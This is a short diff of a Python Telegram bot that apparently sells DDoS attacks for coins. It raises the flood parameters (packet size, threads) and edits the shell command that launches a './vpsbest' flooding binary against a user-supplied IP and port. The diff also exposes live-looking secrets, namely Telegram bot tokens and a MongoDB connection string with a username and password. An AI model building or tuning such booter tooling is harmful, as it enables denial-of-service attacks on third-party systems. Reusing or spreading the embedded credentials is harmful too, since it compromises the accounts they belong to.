@@ -10,19 +10,19 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7771705631:AAFCxqSKUwtPk2Y-LWlyfcjNOM4_DLUo6EA'
+TELEGRAM_BOT_TOKEN = '7660887190:AAFcHafd0mOaP99wqxu0C-vJ_PK2tEXGHCk'
 ADMIN_USER_ID = 7352008650
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "Sikandarr2"
 COLLECTION_NAME = "users"
 attack_in_progress = False
-ATTACK_TIME_LIMIT = 600  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
 ATTACK_COOLDOWN = 10 # Cooldown period in seconds (5 minutes)
 
 # Global variables for packet size and threads
-packet_size = 1
-threads = 500
+packet_size = 9
+threads = 600
 
 # Global variables for managing cooldowns
 last_attack_time = defaultdict(lambda: datetime.min)
@@ -196,7 +196,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./vpsbest {ip} {port} {duration} {1} {10}"
+        command = f"./vpsbest {ip} {port} {duration} {9} {900}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
